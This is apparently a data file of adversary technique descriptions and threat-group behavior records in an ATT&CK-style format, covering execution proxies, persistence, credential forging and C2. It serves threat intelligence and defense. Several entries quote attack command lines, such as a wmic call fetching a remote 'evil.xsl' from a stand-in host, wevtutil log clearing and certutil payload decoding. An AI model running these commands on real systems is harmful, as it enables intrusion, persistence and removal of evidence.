Verclsid,"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running verclsid.exe /S /C {CLSID}, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to ). Since it is signed and native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse. ",technique
Video Capture,"An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from  due to use of specific devices or applications for video recording rather than capturing the victim's screen.In macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton. ",technique
Virtual Private Server,"Before compromising a victim, adversaries may rent Virtual Private Servers (VPSs)that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.",technique
Virtual Private Server,"Before compromising a victim, adversaries may compromise third-party Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. Adversaries may compromise VPSs purchased by third-party entities. By compromising a VPS to use as infrastructure, adversaries can make it difficult to physically tie back operations to themselves.Compromising a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers as well as that added by the compromised third-party.",technique
Virtualization/Sandbox Evasion,"Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from  during automated discovery to shape follow-on behaviors. Adversaries may use several methods to accomplish  such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",technique
Visual Basic,"Adversaries may abuse Visual Basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as  and the  through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of  on HTML Application (HTA) webpages served to Internet Explorer (though most modern browsers do not come with VBScript support).Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into  payloads.",technique
Vulnerabilities,"Before compromising a victim, adversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.An adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. ) or to attempt to develop one themselves (i.e. ).",technique
Vulnerability Scanning,"Before compromising a victim, adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.These scans may also include more broad attempts to  that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex: ).",technique
WHOIS,"Before compromising a victim, adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:  or ), establishing operational resources (ex:  or ), and/or initial access (ex:  or ).",technique
Weaken Encryption,"Adversaries may compromise a network devices encryption capability in order to bypass encryption that would otherwise protect data communications. Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as , , and , an adversary can negatively effect and/or eliminate a devices ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. ",technique
Web Portal Capture,"Adversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service.This variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through  and  or as part of the initial compromise by exploitation of the externally facing web service.",technique
Web Protocols,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. ",technique
Web Service,"Adversaries may use an existing, legitimate external Web service as a means for relaying data to/from a compromised system. Popular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).",technique
Web Services,"Before compromising a victim, adversaries may register for web servicesthat can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control () or . Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",technique
Web Services,"Before compromising a victim, adversaries may compromise access to third-party web servicesthat can be used during targeting. A variety of popular websites exist for legitimate users to register for web-based services, such as GitHub, Twitter, Dropbox, Google, etc. Adversaries may try to take ownership of a legitimate user's access to a web service and use that web service as infrastructure in support of cyber operations. Such web services can be abused during later stages of the adversary lifecycle, such as during Command and Control () or . Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, particularly when access is stolen from legitimate users, adversaries can make it difficult to physically tie back operations to them.",technique
Web Session Cookie,"Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through , the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform.There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.",technique
Web Shell,"Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex:  Web shell client). ",technique
Windows Command Shell,"Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd.exe) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may leverage cmd.exe to execute various commands and payloads. Common uses include cmd.exe /c to execute a single command, or abusing cmd.exe interactively with input and output forwarded over a command and control channel.",technique
Windows File and Directory Permissions Modification,"Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Windows implements file and directory ACLs as Discretionary Access Control Lists (DACLs). Similar to a standard ACL, DACLs identifies the accounts that are allowed or denied access to a securable object. When an attempt is made to access a securable object, the system checks the access control entries in the DACL in order. If a matching entry is found, access to the object is granted. Otherwise, access is denied.Adversaries can interact with the DACLs using built-in Windows commands, such as `icacls`, `cacls`, `takeown`, and `attrib`, which can grant adversaries higher permissions on specific files and folders. Further,  provides cmdlets that can be used to retrieve or modify file and directory DACLs. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via , , or tainting/hijacking other instrumental binary/configuration files via .",technique
Windows Management Instrumentation,"Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB)  and Remote Procedure Call Service (RPCS)  for remote access. RPCS operates over port 135. An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement.  ",technique
Windows Management Instrumentation Event Subscription,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.   Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.  WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",technique
Windows Remote Management,"Adversaries may use  to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services). It may be called with the `winrm` command or by any number of programs such as PowerShell.",technique
Windows Service,"Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions. Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and . Adversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.An adversary may also incorporate  by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used. Services may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through . ",technique
Winlogon Helper DLL,"Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\ and HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\ are used to manage additional helper programs and functionalities that support Winlogon.  Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: * Winlogon\Notify - points to notification package DLLs that handle Winlogon events* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs onAdversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.",technique
XSL Script Processing,"Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to , the Microsoft common line transformation utility binary (msxsl.exe)  can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files.  Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files.  Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.Command-line examples:* msxsl.exe customers[.]xml script[.]xsl* msxsl.exe script[.]xsl script[.]xsl* msxsl.exe script[.]jpeg script[.]jpegAnother variation of this technique, dubbed Squiblytwo, involves using  to invoke JScript or VBScript within an XSL file. This technique can also execute local/remote scripts and, similar to its / ""Squiblydoo"" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in  provided they utilize the /FORMAT switch.Command-line examples:* Local File: wmic process list /FORMAT:evil[.]xsl* Remote File: wmic os get /FORMAT:https[:]//example[.]com/evil[.]xsl",technique
Additional Cloud Credentials,"Adversaries may add adversary-controlled credentials to a cloud account to maintain persistent access to victim accounts and instances within the environment.Adversaries may add credentials for Service Principals and Applications in addition to existing legitimate credentials in Azure AD. These credentials include both x509 keys and passwords. With sufficient permissions, there are a variety of ways to add credentials including the Azure Portal, Azure command line interface, and Azure or Az PowerShell modules.In infrastructure-as-a-service (IaaS) environments, after gaining access through , adversaries may generate or import their own SSH keys using either the CreateKeyPair or ImportKeyPair API in AWS or the gcloud compute os-login ssh-keys add command in GCP. This allows persistent access to instances within the cloud environment without further usage of the compromised cloud accounts.",technique
Domain Policy Modification,"Adversaries may modify the configuration settings of a domain to evade defenses and/or escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain/forest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.With sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious  to computers throughout the domain environment or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources. Adversaries can also change configuration settings within the AD environment to implement a .Adversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",technique
Group Policy Modification,"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\. Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.Malicious GPO modifications can be used to implement many other malicious behaviors such as , , , , ,  and more. Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.For example, publicly available scripts such as New-GPOImmediateTask can be leveraged to automate the creation of a malicious  by modifying GPO settings, in this case modifying &lt;GPO_PATH&gt;\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml. In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in &lt;GPO_PATH&gt;\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.",technique
Domain Trust Modification,"Adversaries may add new domain trusts or modify the properties of existing domain trusts to evade defenses and/or elevate privileges. Domain trust details, such as whether or not a domain is federated, allow authentication and authorization properties to apply between domains for the purpose of accessing shared resources. These trust objects may include accounts, credentials, and other authentication material applied to servers, tokens, and domains.Manipulating the domain trusts may allow an adversary to escalate privileges and/or evade defenses by modifying settings to add objects which they control. For example, this may be used to forge , without the need to compromise the signing certificate to forge new credentials. Instead, an adversary can manipulate domain trusts to add their own signing certificate.",technique
Forge Web Credentials,"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.Adversaries may generate these credential materials in order to gain access to web resources. This differs from , , and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, , or other cryptographic seed values.Once forged, adversaries may use these web credentials to access resources (ex: ), which may bypass multi-factor and other authentication protection mechanisms.",technique
Web Cookies,"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.Adversaries may generate these cookies in order to gain access to web resources. This differs from  and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces. The generation of web cookies often requires secret values, such as passwords, , or other cryptographic seed values.Once forged, adversaries may use these web cookies to access resources (), which may bypass multi-factor and other authentication protection mechanisms.",technique
SAML Tokens,"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate. The default lifetime of a SAML token is one hour, but the validity period can be specified in the NotOnOrAfter value of the conditions ... element in a token. This value can be changed using the AccessTokenLifetime in a LifetimeTokenPolicy. Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.An adversary may utilize  to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate. This differs from  and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to , which may bypass multi-factor and other authentication protection mechanisms.",technique
Spearphishing Attachment,has used spearphishing emails with password protected RAR attachment to avoid being detected by the email gateway. ,relationship
Obfuscated Files or Information,has used ConfuserEx to obfuscate its variant of  compressed payload and RAT packages and password protected encrypted email attachments to avoid detection.,relationship
Scheduled Task,has used a macro function to set scheduled tasks disguised as those used by Google.,relationship
Malicious File,has prompted victims to accept macros in order to execute the subsequent payload.,relationship
Non-Standard Port,has used port 4050 for C2 communications.,relationship
Masquerade Task or Service,has disguised its scheduled tasks as those used by Google.,relationship
Visual Basic,has embedded a VBScript within a malicious Word document which is executed upon the document opening.,relationship
Ingress Tool Transfer,has downloaded binary data from a specified domain after the malicious document is opened.,relationship
LSASS Memory,has been known to use credential dumping using .,relationship
Remote Desktop Protocol,The  group is known to have used RDP during operations.,relationship
Data from Local System,has collected files from a local victim.,relationship
Archive via Utility,has used RAR to compress files before moving them outside of the victim network.,relationship
Windows Command Shell,has used the Windows command shell to execute commands and batch scripting to automate execution.,relationship
Process Discovery,gathered a list of running processes on the system using tasklist /v.,relationship
Local Email Collection,uses two utilities GETMAIL and MAPIGET to steal email. GETMAIL extracts emails from archived Outlook .pst files.,relationship
Match Legitimate Name or Location,The file name AcroRD32.exe a legitimate process name for Adobe's Acrobat Reader was used by  as a name for malware.,relationship
System Network Connections Discovery,used the net use command to get a listing on network connections.,relationship
Local Account,used the commands net localgroupnet user and net group to find accounts on the system.,relationship
Automated Collection,used a batch script to perform a series of discovery techniques and saves it to a text file.,relationship
Pass the Hash,The  group is known to have used pass the hash.,relationship
Network Share Discovery,listed connected network shares.,relationship
System Service Discovery,used the commands net start and tasklist to get a listing of the services on the system.,relationship
System Network Configuration Discovery,used the ipconfig /all command to gather network configuration information.,relationship
Remote Email Collection,uses two utilities GETMAIL and MAPIGET to steal email. MAPIGET steals email still on Exchange servers that has not yet been archived.,relationship
Domains,has registered hundreds of domains for use in operations.,relationship
Domains,hijacked FQDNs associated with legitimate websites hosted by hop points.,relationship
Spearphishing Link,has sent spearphishing emails containing hyperlinks to malicious files.,relationship
Spearphishing Attachment,has sent spearphishing emails containing malicious attachments.,relationship
Email Accounts,has created email accounts for later use in social engineering phishing and when registering domains.,relationship
Malware,used publicly available malware for privilege escalation.,relationship
Malicious File,has attempted to get victims to open malicious Microsoft Word and PDF attachment sent via spearphishing.,relationship
Exploitation for Client Execution,has exploited multiple vulnerabilities for execution including Microsoft Office vulnerabilities (CVE-2009-3129 CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324 CVE-2009-0927 CVE-2011-0609 CVE-2011-0611).,relationship
Spearphishing Attachment,has sent emails with malicious Microsoft Office documents and PDFs attached.,relationship
Bidirectional Communication,has used blogs and WordPress for C2 infrastructure.,relationship
DNS Calculation,has used multiple variants of  including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port.,relationship
Server,has compromised otherwise legitimate sites as staging servers for second-stage payloads.,relationship
Web Services,has created profile pages in Microsoft TechNet that were used as C2 infrastructure.,relationship
Establish Accounts,has created and cultivated profile pages in Microsoft TechNet. To make profile pages appear more legitimate  has created biographical sections and posted in forum threads.,relationship
External Remote Services,actors leverage legitimate credentials to log into external remote services.,relationship
File and Directory Discovery,can list files information for specific directories.,relationship
Obfuscated Files or Information,obfuscates strings in the payload.,relationship
Web Protocols,uses HTTP for C2 communications.,relationship
Valid Accounts,actors leverage legitimate credentials to log into external remote services.,relationship
Commonly Used Port,uses port 80 for C2 communications.,relationship
Registry Run Keys / Startup Folder,establishes persistence via the HKCU\Software\Microsoft\Windows\CurrentVersion\Run key.,relationship
Ingress Tool Transfer,can upload a file to the victims machine.,relationship
Windows Command Shell,uses cmd.exe to execute commands on the victims machine.,relationship
At (Windows),actors used the native  Windows task scheduler tool to use scheduled tasks for execution on a victim network.,relationship
File Deletion,actors deleted tools and batch files from victim systems.,relationship
System Information Discovery,can collect system information from the victims machine.,relationship
DNS,uses DNS for C2 communications.,relationship
System Network Configuration Discovery,used an HTTP malware variant and a Port 22 malware variant to collect the MAC address and IP address from the victims machine.,relationship
Malicious File,attempted to get users to launch malicious attachments delivered via spearphishing emails.,relationship
Web Protocols,used HTTP for C2 communications.  also used an HTTP malware variant to communicate over HTTP for C2.,relationship
Commonly Used Port,used TCP port 80 for C2.,relationship
Standard Encoding,An  HTTP malware variant used Base64 to encode communications to the C2 server.,relationship
Regsvr32,used Regsvr32 to bypass application control techniques.,relationship
Command and Scripting Interpreter,downloaded and launched code within a SCT file.,relationship
System Information Discovery,collected system architecture information.  used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victims machine.,relationship
Rundll32,configured its payload to inject into the rundll32.exe.,relationship
Registry Run Keys / Startup Folder,An  HTTP malware variant establishes persistence by setting the Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\.,relationship
System Owner/User Discovery,used an HTTP malware variant and a Port 22 malware variant to collect the victims username.,relationship
DLL Side-Loading,launched an HTTP malware variant and a Port 22 malware variant using a legitimate executable that loaded the malicious DLL.,relationship
Modify Registry,uses a Port 22 malware variant to modify several Registry keys.,relationship
PowerShell,used PowerShell commands to execute payloads.,relationship
Drive-by Compromise,performed a watering hole attack on forbes.com in 2014 to compromise targets.,relationship
Spearphishing Attachment,sent spearphishing emails with malicious attachments in RTF and XLSM formats to deliver initial exploits.,relationship
Windows Service,An  Port 22 malware variant registers itself as a service.,relationship
Deobfuscate/Decode Files or Information,An  HTTP malware variant decrypts strings using single-byte XOR keys.,relationship
Obfuscated Files or Information,used Base64 to obfuscate commands and the payload.,relationship
Hidden Window,used -W Hidden to conceal  windows by setting the WindowStyle parameter to hidden. ,relationship
Junk Data,added junk data to each encoded string preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a junk length value when created tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.,relationship
Replication Through Removable Media,uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.,relationship
Remote Email Collection,has collected emails from victim Microsoft Exchange servers.,relationship
Ingress Tool Transfer,has downloaded additional files including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.,relationship
Dynamic Data Exchange,has delivered  and  by executing PowerShell commands through DDE in Word documents.,relationship
Hidden Files and Directories,has saved files with hidden file attributes.,relationship
Timestomp,has performed timestomping on victim files.,relationship
Spearphishing Link,sent spearphishing emails which used a URL-shortener service to masquerade as a legitimate service and to redirect targets to credential harvesting sites.,relationship
Peripheral Device Discovery,uses a module to receive a notification every time a USB mass storage device is inserted into a victim.,relationship
Screen Capture,has used tools to take screenshots from victims.,relationship
File and Directory Discovery,has used  to locate PDF Excel and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.,relationship
Clear Windows Event Logs,has cleared event logs including by using the commands wevtutil cl System and wevtutil cl Security.,relationship
Malicious File,attempted to get users to click on Microsoft Office attachments containing malicious macro scripts.,relationship
Component Object Model Hijacking,has used COM hijacking for persistence by replacing the legitimate MMDeviceEnumerator object with a payload.,relationship
Spearphishing Attachment,sent spearphishing emails containing malicious Microsoft Office attachments.,relationship
Sharepoint,has collected information from Microsoft SharePoint services within target networks.,relationship
Logon Script (Windows),An  loader Trojan adds the Registry key HKCU\Environment\UserInitMprLogonScript to establish persistence.,relationship
Network Sniffing,deployed the open source tool Responder to conduct NetBIOS Name Service poisoning which captured usernames and hashed passwords that allowed access to legitimate credentials.  close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.,relationship
Bootkit,has deployed a bootkit along with  to ensure its persistence on the victim. The bootkit shares code with some variants of .,relationship
Exploitation for Privilege Escalation,has exploited CVE-2014-4076 CVE-2015-2387 CVE-2015-1701 CVE-2017-0263 to escalate privileges.,relationship
Exploitation for Defense Evasion,has used CVE-2015-4902 to bypass security features.,relationship
Automated Collection,used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.,relationship
Token Impersonation/Theft,has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.,relationship
Data from Removable Media,An  backdoor may collect the entire contents of an inserted USB device.,relationship
Local Data Staging,has stored captured credential information in a file named pi.log.,relationship
Pass the Hash,has used pass the hash for lateral movement.,relationship
Valid Accounts,has used legitimate credentials to gain initial access maintain access and exfiltrate data from a victim network. The group has specifically used credentials stolen through a spearphishing email to login to the DCCC network. The group has also leveraged default manufacturer's passwords to gain initial access to corporate networks via IoT devices such as a VOIP phone printer and video decoder.,relationship
Trusted Relationship,Once  gained access to the DCCC network the group then proceeded to use that access to compromise the DNC network.,relationship
Rundll32,executed  by using rundll32 commands such as rundll32.exe C:\Windows\twain_64.dll.  also executed a .dll for a first stage dropper using rundll32.exe. An  loader Trojan saved a batch script that uses rundll32 to execute a DLL payload.,relationship
Mail Protocols,used SMTP as a communication channel in various implants initially using self-registered Google Mail accounts and later compromised email servers of its victims.,relationship
PowerShell,downloads and executes PowerShell scripts.,relationship
Communication Through Removable Media,uses a tool that captures information from air-gapped computers via an infected USB and transfers it to network-connected computer when the USB is inserted.,relationship
Data from Local System,has retrieved internal documents from machines inside victim environments including by using  to stage documents before exfiltration.,relationship
LSASS Memory,regularly deploys both publicly available (ex: ) and custom password retrieval tools on victims.,relationship
File Deletion,has intentionally deleted computer files to cover their tracks including with use of the program CCleaner.,relationship
Obfuscated Files or Information,encrypted a .dll payload using RTL and a custom encryption algorithm.  has also obfuscated payloads with base64 XOR and RC4.,relationship
Rootkit,has used a UEFI (Unified Extensible Firmware Interface) rootkit known as .,relationship
Archive Collected Data,used a publicly available tool to gather and compress multiple documents on the DCCC and DNC networks.,relationship
Windows Command Shell,An  loader Trojan uses a cmd.exe and batch script to run its payload. The group has also used macros to execute payloads.,relationship
External Proxy,used other victims as proxies to relay command traffic for instance using a compromised Georgian military email server as a hop point to NATO victims. The group has also used a tool that acts as a proxy to allow C2 even if the victim is behind a router.  has also used a machine to relay and obscure communications between  and their server.,relationship
Process Discovery,An  loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.,relationship
Exploitation of Remote Services,exploited a Windows SMB Remote Code Execution Vulnerability to conduct lateral movement.,relationship
Keylogging,has used tools to perform keylogging.,relationship
Deobfuscate/Decode Files or Information,An  macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.,relationship
Exploitation for Client Execution,has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.,relationship
Office Test,has used the Office Test persistence mechanism within Microsoft Office by adding the Registry key HKCU\Software\Microsoft\Office test\Special\Perf to execute code.,relationship
Template Injection,used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro. ,relationship
Symmetric Cryptography,installed a Delphi backdoor that used a custom algorithm for C2 communications.,relationship
Commonly Used Port,has used port 443 for C2.,relationship
Application Access Token,has used several malicious applications that abused OAuth access tokens to gain access to target email accounts including Gmail and Yahoo Mail.,relationship
